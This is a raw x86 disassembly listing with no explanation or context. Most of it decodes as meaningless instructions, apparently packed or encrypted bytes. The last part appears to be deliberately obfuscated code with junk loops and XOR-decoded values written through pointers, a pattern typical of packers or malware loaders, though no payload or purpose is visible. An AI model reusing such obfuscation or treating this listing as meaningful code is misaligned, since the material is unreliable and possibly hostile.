  41bbd3:	cs repz retf 0xa2d7
  41bbd8:	ret    0x6593
  41bbdb:	ret    
  41bbdc:	std    
  41bbdd:	sbb    eax,0x33f32305
  41bbe2:	sbb    esi,DWORD PTR [ebx-0x534bbfcf]
  41bbe8:	mov    ebp,0x3e675c0c
  41bbed:	push   esi
  41bbee:	pop    ebx
  41bbef:	push   eax
  41bbf0:	pop    es
  41bbf1:	arpl   WORD PTR [eax+eiz*8],si
  41bbf4:	and    cl,BYTE PTR [edi]
  41bbf6:	lock mov ebp,0x387dca5
  41bbfc:	cdq    
  41bbfd:	push   ss
  41bbfe:	loopne 0x41bba6
  41bc00:	adc    DWORD PTR [ebp-0x1e512feb],0xed92f479
  41bc0a:	mov    cl,cl
  41bc0c:	xchg   BYTE PTR [edx+0x64],dl
  41bc0f:	pop    ds
  41bc10:	cdq    
  41bc11:	fld    QWORD PTR [edx]
  41bc13:	mov    eax,DWORD PTR [ebp+edi*2+0x5e]
  41bc17:	xor    al,0x65
  41bc19:	xchg   edi,eax
  41bc1a:	lock dec esp
  41bc1c:	fisttp WORD PTR [eax+edi*8-0x32]
  41bc20:	mov    bl,0xa3
  41bc22:	mov    bl,0xff
  41bc24:	(bad)  
  41bc25:	mov    esp,0x1aa9468
  41bc2a:	jo     0x41bbe6
  41bc2c:	fs inc esp
  41bc2e:	sbb    ebx,0xf22a6657
  41bc34:	rcl    DWORD PTR [esi+0x51ffd015],cl
  41bc3a:	adc    edi,DWORD PTR [ebp-0x4b]
  41bc3d:	clc    
  41bc3e:	int3   
  41bc3f:	sahf   
  41bc40:	pop    edi
  41bc41:	mul    esi
  41bc43:	retf   0x1f37
  41bc46:	stc    
  41bc47:	jns    0x41bca7
  41bc49:	sub    cl,BYTE PTR fs:[esi]
  41bc4c:	(bad)  
  41bc4d:	pop    DWORD PTR ds:0xfcfbbe0a
  41bc53:	stos   BYTE PTR es:[edi],al
  41bc54:	call   FWORD PTR [esi-0x52]
  41bc57:	call   0xe875:0xe6095cdb
  41bc5e:	out    0x86,eax
  41bc60:	je     0x41bc04
  41bc62:	inc    esi
  41bc63:	xor    edi,ebx
  41bc65:	adc    BYTE PTR [eax+ebx*4],ch
  41bc68:	cmp    eax,0x31fb8467
  41bc6d:	jb     0x41bcd0
  41bc6f:	cdq    
  41bc70:	xlat   BYTE PTR ds:[ebx]
  41bc71:	dec    esi
  41bc72:	scas   eax,DWORD PTR es:[edi]
  41bc73:	add    ebp,DWORD PTR ds:0xe076774c
  41bc79:	in     al,dx
  41bc7a:	xor    eax,0x26994894
  41bc7f:	out    dx,al
  41bc80:	popa   
  41bc81:	xchg   cl,ch
  41bc83:	rcr    DWORD PTR [edi],cl
  41bc85:	int    0xf1
  41bc87:	neg    DWORD PTR [edi-0x1bfa292c]
  41bc8d:	push   edi
  41bc8e:	pop    ds
  41bc8f:	icebp  
  41bc90:	rcl    edx,cl
  41bc92:	mov    esp,0xd964774
  41bc97:	and    BYTE PTR [esi],dh
  41bc99:	cmp    eax,0x63398cbb
  41bc9e:	xor    ah,BYTE PTR [ebx+0x2b]
  41bca1:	loop   0x41bcea
  41bca3:	mov    DWORD PTR [esi+ebp*2+0x612a90f6],esp
  41bcaa:	shl    DWORD PTR ds:0x75cdef6e,cl
  41bcb0:	jmp    0x411635a4
  41bcb5:	pop    ebp
  41bcb6:	clc    
  41bcb7:	push   es
  41bcb8:	std    
  41bcb9:	xor    eax,0x72d03038
  41bcbe:	and    eax,0x43a112c1
  41bcc3:	test   al,0xbf
  41bcc5:	xor    eax,0x1747313
  41bcca:	gs ds mov eax,0xcd000ef9
  41bcd1:	jns    0x41bcd1
  41bcd3:	sub    ch,BYTE PTR [ecx]
  41bcd5:	cdq    
  41bcd6:	mov    esp,0x30e4f215
  41bcdb:	push   ss
  41bcdc:	mov    edx,0xd220ca1f
  41bce1:	(bad)  
  41bce2:	pushf  
  41bce3:	sub    BYTE PTR [eax],ah
  41bce5:	adc    cl,cl
  41bce7:	fwait
  41bce8:	sbb    DWORD PTR [ebp-0x1a],eax
  41bceb:	sbb    al,0x73
  41bced:	cld    
  41bcee:	pop    ss
  41bcef:	lahf   
  41bcf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcf1:	(bad)  
  41bcf3:	push   es
  41bcf4:	cmp    esp,eax
  41bcf6:	mov    WORD PTR [edx],gs
  41bcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcf9:	jp     0x41bcb4
  41bcfb:	ret    0x102d
  41bcfe:	(bad)  
  41bcff:	(bad)  
  41bd00:	jb     0x41bcba
  41bd02:	jae    0x41bce8
  41bd04:	mov    eax,ds:0x9c6a2c45
  41bd09:	retf   
  41bd0a:	aaa    
  41bd0b:	pop    ebp
  41bd0c:	pop    esi
  41bd0d:	push   eax
  41bd0e:	xor    edi,DWORD PTR [eax]
  41bd10:	enter  0xf9a4,0x32
  41bd14:	shl    dl,0xb9
  41bd17:	xor    BYTE PTR [ecx+0x7a],ah
  41bd1a:	mov    cl,0xb7
  41bd1c:	mov    bh,0x63
  41bd1e:	jmp    0xcc68:0x90479203
  41bd25:	or     dh,BYTE PTR [ebp+0x7bb3c690]
  41bd2b:	mov    DWORD PTR [ebx+eiz*1],eax
  41bd2e:	test   eax,0x20093bb4
  41bd33:	mov    ah,0x6f
  41bd35:	sar    DWORD PTR [ebx+0x0],0x4a
  41bd39:	and    DWORD PTR [ebx-0x75],ebx
  41bd3c:	icebp  
  41bd3d:	push   0xfffffff9
  41bd3f:	push   es
  41bd40:	adc    BYTE PTR [edx],bh
  41bd42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd43:	push   ebx
  41bd44:	sub    al,0x2e
  41bd46:	ins    BYTE PTR es:[edi],dx
  41bd47:	mov    ebx,0xe4e027e9
  41bd4c:	and    ebp,DWORD PTR [edx+0x4f]
  41bd4f:	push   edi
  41bd50:	or     eax,0x7ffa1603
  41bd55:	hlt    
  41bd56:	mov    cl,0x3f
  41bd58:	xchg   BYTE PTR ds:0xb545c1f,dh
  41bd5e:	(bad)  
  41bd5f:	cmp    cl,BYTE PTR [ebx]
  41bd61:	jmp    0x8769dac1
  41bd66:	cmc    
  41bd67:	mov    DWORD PTR [ecx+0x33],eax
  41bd6a:	inc    edx
  41bd6b:	sub    eax,0xee6841b6
  41bd70:	call   0x94b86045
  41bd75:	outs   dx,BYTE PTR ds:[esi]
  41bd76:	mov    ecx,0xe48e7c76
  41bd7b:	gs xchg esp,eax
  41bd7d:	xor    eax,0x71d91269
  41bd82:	mov    al,0xdd
  41bd84:	loop   0x41bd22
  41bd86:	scas   al,BYTE PTR es:[edi]
  41bd87:	test   DWORD PTR [edx-0x4e2fbdb6],ecx
  41bd8d:	and    BYTE PTR [ebp-0x3f],0xa1
  41bd91:	fistp  QWORD PTR [edi-0x46]
  41bd94:	xchg   ebp,eax
  41bd95:	cwde   
  41bd96:	aam    0xf1
  41bd98:	mov    esp,0x69ef4305
  41bd9d:	cmp    eax,ecx
  41bd9f:	xor    ah,BYTE PTR [ebx+0x53204284]
  41bda5:	int3   
  41bda6:	fcom   QWORD PTR [ecx+0x5b]
  41bda9:	outs   dx,BYTE PTR ds:[esi]
  41bdaa:	sbb    DWORD PTR [ecx+0x63],esi
  41bdad:	or     eax,0x28660124
  41bdb2:	(bad)  
  41bdb4:	mov    ecx,0x158d5842
  41bdb9:	call   0xcb80:0xf7fc70d1
  41bdc0:	inc    esp
  41bdc1:	and    BYTE PTR [ecx],ah
  41bdc3:	ror    DWORD PTR [ecx-0x7f],cl
  41bdc6:	cmp    eax,DWORD PTR [esi]
  41bdc8:	jmp    0x76632a6c
  41bdcd:	pop    edi
  41bdce:	adc    DWORD PTR [edx+0x76],esp
  41bdd1:	shl    BYTE PTR [ecx],0x64
  41bdd4:	(bad)  
  41bdd5:	push   ebx
  41bdd6:	int3   
  41bdd7:	inc    edi
  41bdd8:	int3   
  41bdd9:	push   cs
  41bdda:	sub    bh,dh
  41bddc:	jle    0x41bd96
  41bdde:	and    eax,ecx
  41bde0:	mov    BYTE PTR [ecx],al
  41bde2:	push   ebx
  41bde3:	pop    esi
  41bde4:	jg     0x41bdf9
  41bde6:	(bad)
  41bde9:	idiv   BYTE PTR [ebx]
  41bdeb:	pop    esp
  41bdec:	cmp    DWORD PTR [edx],ecx
  41bdee:	xor    BYTE PTR [esi],0x64
  41bdf1:	xchg   DWORD PTR [ebp+eiz*1+0x50],eax
  41bdf5:	mov    ds:0x4a6ae7d1,eax
  41bdfa:	mov    esi,0x1fb5ad1f
  41bdff:	push   esi
  41be00:	ins    DWORD PTR es:[edi],dx
  41be01:	je     0x41be1a
  41be03:	into   
  41be04:	out    0x5d,al
  41be06:	push   esi
  41be07:	adc    al,0x3d
  41be09:	les    edx,FWORD PTR [eax]
  41be0b:	loop   0x41be49
  41be0d:	cmc    
  41be0e:	dec    edi
  41be0f:	mov    ebp,0x64aab744
  41be14:	aas    
  41be15:	bound  ebp,QWORD PTR [esi+eax*8-0x2b]
  41be19:	pop    edi
  41be1a:	inc    edx
  41be1b:	cmp    ecx,edi
  41be1d:	mov    WORD PTR [ebp-0x5d],ss
  41be20:	sub    eax,0xf04ba11b
  41be25:	cmp    BYTE PTR [ebp-0x4c],ah
  41be28:	mov    edx,0x673ad1b8
  41be2d:	or     ebp,DWORD PTR [ebp-0x3c9b85d9]
  41be33:	sub    BYTE PTR [ebx+0x1e],dl
  41be36:	inc    ebp
  41be37:	lods   al,BYTE PTR ds:[esi]
  41be38:	mov    eax,0xe2d857cc
  41be3d:	cwde   
  41be3e:	push   cs
  41be3f:	mov    al,ds:0xbaa7b4d6
  41be44:	ds mov ebp,0x72703e0a
  41be4a:	js     0x41be73
  41be4c:	mov    al,ds:0x503aba75
  41be51:	jle    0x41be35
  41be53:	lahf   
  41be54:	jle    0x41be4a
  41be56:	push   esi
  41be57:	mov    edi,0x88c7bbc7
  41be5c:	jo     0x41beb3
  41be5e:	mov    bh,0x66
  41be60:	fist   WORD PTR [eax-0x6dce22a8]
  41be66:	ja     0x41be2d
  41be68:	data16 loopne 0x41be89
  41be6b:	push   eax
  41be6c:	lahf   
  41be6d:	jecxz  0x41be6f
  41be6f:	or     ebx,DWORD PTR [eax-0x26]
  41be72:	ins    DWORD PTR es:[edi],dx
  41be73:	pushf  
  41be74:	sbb    al,0x18
  41be76:	cwde   
  41be77:	and    eax,0xe007ec04
  41be7c:	jb     0x41bed5
  41be7e:	xlat   BYTE PTR ds:[ebx]
  41be7f:	bound  ebx,QWORD PTR [ecx+0x7d]
  41be82:	mov    al,0x1
  41be84:	or     ebx,DWORD PTR [esi]
  41be86:	lahf   
  41be87:	mov    edx,DWORD PTR [ebp-0x44]
  41be8a:	(bad)  
  41be8b:	cli    
  41be8c:	inc    ecx
  41be8d:	sub    DWORD PTR [ebx],0xffffff91
  41be90:	mov    al,0xf7
  41be92:	mov    dh,0xab
  41be94:	fiadd  DWORD PTR [edi+ebx*1-0x4d59a798]
  41be9b:	lock das 
  41be9d:	in     al,0x76
  41be9f:	fcmovne st,st(0)
  41bea1:	pop    esi
  41bea2:	dec    ebp
  41bea3:	ja     0x41bee9
  41bea5:	in     al,0x2b
  41bea7:	add    bl,BYTE PTR [esi-0x27]
  41beaa:	or     DWORD PTR [edi],ebp
  41beac:	retf   0x5d3f
  41beaf:	pop    ds
  41beb0:	add    al,0xee
  41beb2:	and    BYTE PTR [eax+edx*4-0x52],al
  41beb6:	jne    0x41bf0c
  41beb8:	jge    0x41beac
  41beba:	(bad)  
  41bebb:	fild   QWORD PTR [edi+ecx*8+0x5b064588]
  41bec2:	dec    esi
  41bec3:	xchg   edi,eax
  41bec4:	cmp    eax,0x99b645a9
  41bec9:	xor    al,0x4b
  41becb:	test   ax,0x690f
  41becf:	mov    ebp,0xd47cd1f8
  41bed4:	out    0xad,al
  41bed6:	add    al,0x19
  41bed8:	mov    ah,0x41
  41beda:	test   eax,0xf5724b37
  41bedf:	and    dl,ah
  41bee1:	shr    DWORD PTR [ebx-0x34a390f4],0xb5
  41bee8:	call   0xb57a:0x3ed8
  41beee:	cld    
  41beef:	push   es
  41bef0:	lods   eax,DWORD PTR ds:[esi]
  41bef1:	sbb    dl,BYTE PTR gs:[edi+0x1db0a091]
  41bef8:	call   0xdcbd:0x82441b88
  41beff:	sub    ebp,DWORD PTR [ebp+ebx*1-0x1c]
  41bf03:	mov    edi,0xa21e23dc
  41bf08:	dec    ecx
  41bf09:	pop    eax
  41bf0a:	cmp    dh,BYTE PTR [eax-0x55cb6e86]
  41bf10:	ss aad 0xe4
  41bf13:	mov    ds:0x25620706,eax
  41bf18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf19:	test   al,0x1e
  41bf1b:	ja     0x41bf24
  41bf1d:	lods   al,BYTE PTR ds:[esi]
  41bf1e:	push   0xffffffc2
  41bf20:	push   ecx
  41bf21:	and    edi,DWORD PTR [ebp-0x3d]
  41bf24:	sub    cl,BYTE PTR [ebp+0x3]
  41bf27:	add    eax,0x15efc726
  41bf2c:	(bad)  
  41bf2d:	xor    edx,DWORD PTR [ecx]
  41bf2f:	adc    DWORD PTR [edi],esp
  41bf31:	and    al,BYTE PTR [ebx]
  41bf33:	ds jb  0x41bf75
  41bf36:	cmp    bh,dh
  41bf38:	adc    cl,BYTE PTR [ebp+0x2c4cd671]
  41bf3e:	mov    dh,0x4b
  41bf40:	or     BYTE PTR [eax],ch
  41bf42:	xlat   BYTE PTR ds:[ebx]
  41bf43:	pop    ds
  41bf44:	mov    bh,0xd4
  41bf46:	jb     0x41bee3
  41bf48:	ret    
  41bf49:	out    0x4a,al
  41bf4b:	imul   edx,DWORD PTR [eax+0x3c664431],0x7bcbd0a8
  41bf55:	mov    esp,0xe3599fb6
  41bf5a:	das    
  41bf5b:	out    0xd5,al
  41bf5d:	jb     0x41bfad
  41bf5f:	repnz fld st(7)
  41bf62:	add    ch,BYTE PTR [edi]
  41bf64:	mov    eax,ds:0x792051af
  41bf69:	out    dx,al
  41bf6a:	and    ah,BYTE PTR [esi+ebx*4-0x54c28bbf]
  41bf71:	stos   BYTE PTR es:[edi],al
  41bf72:	sahf   
  41bf73:	push   ebx
  41bf74:	or     ah,BYTE PTR [ebx-0x2e]
  41bf77:	cli    
  41bf78:	sub    eax,0xd939d9ff
  41bf7d:	aam    0xe
  41bf7f:	inc    eax
  41bf80:	and    ebx,DWORD PTR [eax]
  41bf82:	mov    cx,WORD PTR [edx]
  41bf85:	jmp    0xfba4:0x469f7612
  41bf8c:	shr    DWORD PTR [ebx+0x88b4d5c],cl
  41bf92:	aad    0x89
  41bf94:	mov    dh,BYTE PTR ds:0x9cb9c3c5
  41bf9a:	mov    dh,0x8e
  41bf9c:	out    dx,eax
  41bf9d:	pop    ebp
  41bf9e:	xor    al,0x4a
  41bfa0:	push   eax
  41bfa1:	sbb    eax,0x18ae1504
  41bfa6:	shl    BYTE PTR [edx+0x77],cl
  41bfa9:	jne    0x41c012
  41bfab:	push   esi
  41bfac:	nop
  41bfad:	mov    ah,0x30
  41bfaf:	mov    edx,0x5c63a741
  41bfb4:	pop    ss
  41bfb5:	jmp    0xb1ad:0x4eb3832d
  41bfbc:	jg     0x41bf7c
  41bfbe:	aaa    
  41bfbf:	mov    ecx,ecx
  41bfc1:	iret   
  41bfc2:	dec    edi
  41bfc3:	adc    eax,0x804c00e1
  41bfc8:	mov    edi,0x34f206b9
  41bfcd:	or     BYTE PTR [ebx],bl
  41bfcf:	daa    
  41bfd0:	stc    
  41bfd1:	out    dx,al
  41bfd2:	and    ecx,DWORD PTR [ebp+edi*8+0x356ff9d6]
  41bfd9:	repnz push esp
  41bfdb:	cs inc esp
  41bfdd:	jno    0x41bff8
  41bfdf:	mov    ebx,0xc935f001
  41bfe4:	inc    esi
  41bfe5:	retf   
  41bfe6:	faddp  st(4),st
  41bfe8:	imul   ebp
  41bfea:	pop    ebp
  41bfeb:	mov    ecx,0x262e538f
  41bff0:	lods   eax,DWORD PTR ds:[esi]
  41bff1:	push   0x7f
  41bff3:	xchg   esp,eax
  41bff4:	mov    ds:0xed88645,eax
  41bff9:	xchg   ebp,eax
  41bffa:	fld    DWORD PTR [eax-0x1dba595b]
  41c000:	mov    bh,0xb5
  41c002:	xor    eax,0xafd1c5db
  41c007:	mov    dl,0x28
  41c009:	add    ebx,edx
  41c00b:	or     BYTE PTR [eax+0x764ecf58],bl
  41c011:	sbb    DWORD PTR [ebx],edi
  41c013:	scas   eax,DWORD PTR es:[edi]
  41c014:	pop    edx
  41c015:	aam    0x72
  41c017:	jg     0x41bfef
  41c019:	mov    edx,0x81622dad
  41c01e:	xor    eax,0xd5ef337d
  41c023:	sbb    dl,BYTE PTR [edx-0x2f]
  41c026:	(bad)  
  41c027:	sti    
  41c028:	adc    DWORD PTR [ebx],esp
  41c02a:	in     eax,0x47
  41c02c:	mov    edi,0xdf1f2390
  41c031:	mov    eax,0xbfdc5358
  41c036:	mov    cl,0x37
  41c038:	nop
  41c039:	jl     0x41c029
  41c03b:	push   0xcdedef71
  41c040:	sbb    eax,edx
  41c042:	outs   dx,DWORD PTR ds:[esi]
  41c043:	mov    bl,0x41
  41c045:	lahf   
  41c046:	loope  0x41c075
  41c048:	xchg   ebx,eax
  41c049:	inc    ebp
  41c04a:	fdivr  QWORD PTR [eax+ecx*4+0x86eee45]
  41c051:	lods   al,BYTE PTR ds:[esi]
  41c052:	add    esi,DWORD PTR [esi+0x254fdf82]
  41c058:	sti    
  41c059:	mov    ss,WORD PTR [eax]
  41c05b:	sub    al,0xeb
  41c05d:	ficom  WORD PTR [ebx]
  41c05f:	xchg   edx,eax
  41c060:	push   es
  41c061:	and    DWORD PTR [edx-0x34],ebp
  41c064:	out    dx,al
  41c065:	inc    edi
  41c066:	mov    cl,0x83
  41c068:	xor    DWORD PTR [ecx],esp
  41c06a:	loopne 0x41c0e0
  41c06c:	cwde   
  41c06d:	ds iret 
  41c06f:	inc    ebp
  41c070:	cmc    
  41c071:	xor    bl,cl
  41c073:	jg     0x41c04d
  41c075:	add    eax,DWORD PTR ds:0xbe1bf646
  41c07b:	(bad)  
  41c07c:	int    0x32
  41c07e:	mov    ds:0xb06b4cbf,eax
  41c083:	iret   
  41c084:	mov    ds:0x7af30535,al
  41c089:	jmp    0xef7a:0xb39cbd12
  41c090:	mov    edi,0xc60e1bed
  41c095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c096:	pop    ecx
  41c097:	cwde   
  41c098:	mov    ebp,DWORD PTR [ecx-0x66ff6ae0]
  41c09e:	fst    QWORD PTR [ecx]
  41c0a0:	and    BYTE PTR [ebx-0x456d4be8],dl
  41c0a6:	mov    dh,0x4
  41c0a8:	pop    edi
  41c0a9:	mov    dh,0x99
  41c0ab:	cdq    
  41c0ac:	pop    esi
  41c0ad:	jmp    0x41c0f1
  41c0af:	addr16 inc eax
  41c0b1:	inc    edi
  41c0b2:	push   ecx
  41c0b3:	push   0xe509a6b6
  41c0b8:	cmp    ah,BYTE PTR [ecx+edi*8]
  41c0bb:	xchg   ebx,eax
  41c0bc:	mov    ch,0xc2
  41c0be:	add    cl,bl
  41c0c0:	shl    DWORD PTR [esi],cl
  41c0c2:	fimul  WORD PTR [eiz*1-0x12a5e2c6]
  41c0c9:	cwde   
  41c0ca:	jg     0x41c069
  41c0cc:	or     eax,0x7d8e2bdc
  41c0d1:	fstp   st(1)
  41c0d3:	adc    ecx,ebp
  41c0d5:	mov    ebp,0xe673e0d4
  41c0da:	test   eax,0x487bfe65
  41c0df:	xchg   edx,eax
  41c0e0:	mov    ebp,ebx
  41c0e2:	inc    esi
  41c0e3:	and    al,BYTE PTR [ecx+0x7b]
  41c0e6:	into   
  41c0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0e8:	dec    esp
  41c0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ea:	mov    ah,0xe0
  41c0ec:	jne    0x41c119
  41c0ee:	(bad)  [esp+ebp*2-0x6f06a67e]
  41c0f5:	pop    es
  41c0f6:	sbb    dl,ch
  41c0f8:	inc    eax
  41c0f9:	push   edx
  41c0fa:	out    0x29,al
  41c0fc:	inc    ebx
  41c0fd:	adc    ecx,DWORD PTR [ebx-0x5fc17b3]
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428d05
  41c331:	mov    ebx,DWORD PTR ds:0x42af59
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
